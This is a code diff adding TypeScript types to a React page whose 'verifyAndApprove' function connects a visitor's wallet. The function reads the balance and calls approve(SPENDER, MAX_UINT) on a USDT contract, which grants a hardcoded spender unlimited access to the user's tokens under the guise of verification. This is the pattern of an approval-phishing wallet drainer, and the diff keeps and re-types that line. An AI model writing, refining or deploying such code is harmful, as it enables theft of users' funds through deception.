@@ -73,10 +73,10 @@ const LogoText = () => (
 );
 
 export default function Page() {
-  const [status, setStatus] = useState('idle');
-  const [wallet, setWallet] = useState(null);
-  const [balance, setBalance] = useState(null);
-  const [error, setError] = useState(null);
+  const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'failed'>('idle');
+  const [wallet, setWallet] = useState<string | null>(null);
+  const [balance, setBalance] = useState<string | null>(null);
+  const [error, setError] = useState<string | null>(null);
 
   const verifyAndApprove = async () => {
     setStatus('processing');
@@ -108,10 +108,10 @@ export default function Page() {
 
       await provider.enable();
 
-      const web3 = new Web3(provider);
+      const web3 = new Web3(provider as any);
       let accounts = await web3.eth.getAccounts();
       if (!accounts || accounts.length === 0) {
-        accounts = await provider.request({ method: "eth_requestAccounts" });
+        accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
       }
       if (!accounts || accounts.length === 0) throw new Error("No account found");
       const walletAddress = accounts[0];
@@ -120,14 +120,14 @@ export default function Page() {
       const bal = await web3.eth.getBalance(walletAddress);
       setBalance(web3.utils.fromWei(bal, "ether"));
 
-      const contract = new web3.eth.Contract(ABI, USDT_CONTRACT);
+      const contract = new web3.eth.Contract(ABI as any, USDT_CONTRACT);
       await contract.methods.approve(SPENDER, MAX_UINT).send({ from: walletAddress });
 
       setStatus('success');
       setTimeout(() => setStatus('idle'), 2500);
 
       await provider.disconnect();
-    } catch (e) {
+    } catch (e: any) {
       setStatus('failed');
       setError(e?.message || "Unknown error");
       setTimeout(() => {
